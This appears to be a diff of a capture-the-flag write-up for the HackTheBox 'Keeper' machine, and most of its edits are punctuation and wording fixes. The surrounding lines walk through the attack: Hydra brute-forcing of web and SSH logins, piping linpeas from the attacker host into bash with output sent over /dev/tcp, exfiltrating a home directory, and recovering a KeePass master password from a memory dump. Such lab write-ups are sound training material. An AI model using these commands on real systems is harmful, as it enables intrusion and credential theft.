@@ -15,7 +15,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 6.24 seconds
 ```
 
-We got a website. Let's take a look.
+We got a website. Let’s take a look.
 
 ```bash
 $ firefox http://$TARGET &
@@ -23,7 +23,7 @@ $ firefox http://$TARGET &
 
 ![Initial page](Assets/initial_page_keeper.jpg)
 
-We're directed to `tickets.keeper.htb/rt/`. Let's add `keeper.htb` and `tickets.keeper.htb` to `/etc/hosts` since there's no dns sever to resolve the domain for us.
+We’re directed to `tickets.keeper.htb/rt/`. Let’s add `keeper.htb` and `tickets.keeper.htb` to `/etc/hosts` since there’s no dns sever to resolve the domain for us.
 
 ```bash
 $ sudo bash -c "echo ${TARGET} keeper.htb tickets.keeper.htb >> /etc/hosts"
@@ -33,11 +33,11 @@ Now following the link we get to a Request Tracker login panel.
 
 ![Request Tracker login page](Assets/request_tracker_website.jpg)
 
-Since this seems to be a generic open source thing let's see if there are any known vulnerabilities for our version.
+Since this seems to be a generic open source thing let’s see if there are any known vulnerabilities for our version.
 
 ![Request Tracker version info from the login page](Assets/request_tracker_version.jpg)
 
-Quite a few vulnerabilities but no obvious RCE vector. Let's run hydra and sql map in the background + vhost bust and google some more.
+Quite a few vulnerabilities but no obvious RCE vector. Let’s run hydra and sql map in the background + vhost bust and google some more.
 
 ```bash
 $ hydra -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /opt/SecLists/Passwords/darkweb2017-top10000.txt "tickets.keeper.htb" http-post-form "/rt/NoAuth/Login.html:user=^USER^&pass=^PASS^:Your username or password is incorrect"
@@ -59,7 +59,7 @@ And instantly hydra returns a successful login! Lots of pages and options here b
 
 ![User edit page of the request tracker software showing interesting details about the Lise user](Assets/user_edit_page.jpg)
 
-Since we have a password and a user now let's run hydra on ssh to see if we can get a login (Doesn't make much sense to fuzz the app any more, we're root).
+Since we have a password and a user now let’s run hydra on ssh to see if we can get a login (Doesn’t make much sense to fuzz the app anymore, we’re root).
 
 ```BASH
 $ echo "lnorgaard" >> loot/leakedUsers
@@ -79,7 +79,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra)
  ... snip ...
 ```
 
-And we got ssh access. Let's login and run linpeas in the background as we start manually looking around.
+And we got ssh access. Let’s login and run linpeas in the background as we start manually looking around.
 
 ```bash
 $ py -m uploadserver
@@ -99,7 +99,7 @@ and fire off linpeas
 $ curl 10.10.14.30:8000/p | bash &> /dev/tcp/10.10.14.30/9001 &
 ```
 
-It seems there are quite a few interesting files in the home dir of `lnorgaard`:
+It seems there are quite a few interesting files in the home directory of `lnorgaard`:
 
 (Some of these were created by other people solving the box)
 
@@ -125,7 +125,7 @@ drwx------ 2 lnorgaard lnorgaard 4.0K Oct 12 18:03 .ssh
 -rw-r--r-- 1 root      root        39 Jul 20 19:03 .vimrc
 ```
 
-Let's package them and send them over to our box for a closer inspection.
+Let’s package them and send them over to our box for a closer inspection.
 
 ```bash
 lnorgaard@keeper:~$ tar -czvf /tmp/archive.tar.gz .
@@ -167,7 +167,7 @@ Traceback (most recent call last):
 ModuleNotFoundError: No module named 'requests'
 ```
 
-It seems the target doesn't have the requests module installed. That's fine we'll use curl instead.
+It seems the target doesn’t have the requests module installed. That’s fine we’ll use curl instead.
 
 ```bash
 lnorgaard@keeper:~$ which curl
@@ -179,7 +179,7 @@ $ md5sum archive.tar.gz
 4e48d535f3a7bd4f95151780f0e38a2f archive.tar.gz
 ```
 
-Checksums match; upload successful! Let's take a closer look at the keepass DBs.
+Checksums match; upload successful! Let’s take a closer look at the keepass DBs.
 
 ```bash
 $ kpcli
@@ -196,7 +196,7 @@ Please provide the master password: *************************
 Couldn't load the file passcodes_1.kdbx: Missing pass
 ```
 
-Seems like both databases require a master password. Let's run hashcat and ask google if there�s anything interesting that can be done with the dump files.
+Seems like both databases require a master password. Let’s run hashcat and ask google if there’s anything interesting that can be done with the dump files.
 
 ```bash
 $ keepass2john passcodes.kdbx | grep -o "$keepass$.*" >  hashes
@@ -204,7 +204,7 @@ $ hashcat -m 13400 hashes rockyou.txt
  ... doesn't end up cracking ...
 ```
 
-Googling "keepass dump" returns a link to an interesting POC https://github.com/vdohney/keepass-password-dumper . We don't know the version of keepass used but let's try running the exploit anyway.
+Googling “keepass dump” returns a link to an interesting POC https://github.com/vdohney/keepass-password-dumper. We don’t know the version of keepass used but let’s try running the exploit anyway.
 
 ```bash
 $ dotnet run loot/lnorgaardHome/KeePassDumpFull.dmp
@@ -231,11 +231,11 @@ Unknown characters are displayed as "�?"
 Combined: �?{ø, �?, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
 ```
 
-Got something. Very norse looking password but doesn't seem complete. Bruteforcing the remaining letters may take a while as the word list will have to contain norse alphabet letters as well. Let's just toss what we got into google and see if there's anything similar looking and build a wordlist.
+Got something. Very norse looking password but doesn’t seem complete. Bruteforcing the remaining letters may take a while as the word list will have to contain norse alphabet letters as well. Let’s just toss what we got into google and see if there’s anything similar looking and build a wordlist.
 
 ![google search for dgrød med fløde](Assets/odd_danish_meal.jpg)
 
-Seems like the main candidate is `Rødgrød med fløde`. The second letter seems to be in the suggested potential list but the first one is unknown. We'll have to try lower and upper case.
+Seems like the main candidate is `Rødgrød med fløde`. The second letter seems to be in the suggested potential list, but the first one is unknown. We’ll have to try lower and upper case.
 
 ```bash
 $ kpcli
@@ -252,7 +252,7 @@ Please provide the master password: *************************
 kpcli:/>
 ```
 
-`Rødgrød med fløde` doesn't work but `rødgrød med fløde` does! Let's dump the db with https://keepassxc.org.
+`Rødgrød med fløde` doesn’t work but `rødgrød med fløde` does! Let’s dump the db with https://keepassxc.org.
 
 Root putty key here!
 
